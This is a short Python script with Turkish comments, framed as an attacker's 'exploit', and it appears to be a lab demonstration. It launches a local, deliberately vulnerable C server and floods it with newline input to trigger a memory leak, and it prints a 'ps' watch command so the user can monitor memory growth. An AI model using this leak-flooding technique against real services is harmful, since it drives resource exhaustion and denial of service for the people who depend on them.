import subprocess
import time
import sys
import os

VICTIM_PROGRAM = "../compiled/vulnerable_server"

def main():
    print("--- [SALDIRGAN] Bellek Sızıntısı Tetikleyici Başlatıldı ---")
    
    try:
        # Kurban programı bir alt süreç olarak başlatıyoruz.
        p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print(f"[!] HATA: '{VICTIM_PROGRAM}' bulunamadi. C programını derlediniz mi?")
        sys.exit(1)
        
    # --- YENİ EKLENEN KISIM ---
    # Popen nesnesinden PID'yi doğrudan ve güvenilir bir şekilde alıyoruz.
    victim_pid = p.pid
    print(f"[*] '{VICTIM_PROGRAM}' başlatıldı. Tespit edilen PID: {victim_pid}")
    
    # Kullanıcı için izleme komutunu otomatik olarak oluşturuyoruz.
    print("\n" + "="*50)
    print("Bellek artışını izlemek için YENİ BİR TERMİNAL açın.")
    print("Aşağıdaki komutu kopyalayıp o terminale yapıştırın:")
    
    # Linux ve macOS için izleme komutu
    if os.name != 'nt':
        print(f"\n  watch -n 1 'ps -p {victim_pid} -o %mem,rss,vsz,cmd'\n")
    # Windows kullanıcıları için bilgilendirme
    else:
        print(f"\n  Windows için Görev Yöneticisi'ni (Task Manager) açın ve")
        print(f"  '{VICTIM_PROGRAM}' (PID: {victim_pid}) prosesinin bellek kullanımını izleyin.\n")
        
    print("="*50 + "\n")
    # --- DEĞİŞİKLİK SONU ---
        
    print("[*] Sızıntı tetikleniyor... (Durdurmak için CTRL+C)")
    
    leak_count = 0
    try:
        while True:
            # Kurban programa 'Enter' tuşu ('\n') göndererek sızıntıyı tetikle.
            p.stdin.write(b'\n')
            p.stdin.flush() # Verinin hemen gönderilmesini sağla
            leak_count += 1
            
            # Her 1000 sızıntıda bir bilgilendirme mesajı yazdır.
            if leak_count % 1000 == 0:
                print(f"[*] {leak_count * 10 / 1024:.2f} KB bellek sızdırıldı...")
                
            time.sleep(0.001) # Sistemi yormamak için çok kısa bir bekleme
            
    except (KeyboardInterrupt, BrokenPipeError):
        print("\n[*] Tetikleme durduruldu. Kurban program sonlandırılıyor.")
        p.terminate() # Kurban programı sonlandır
    
    print("--- Exploit Tamamlandı ---")

if __name__ == "__main__":
    main()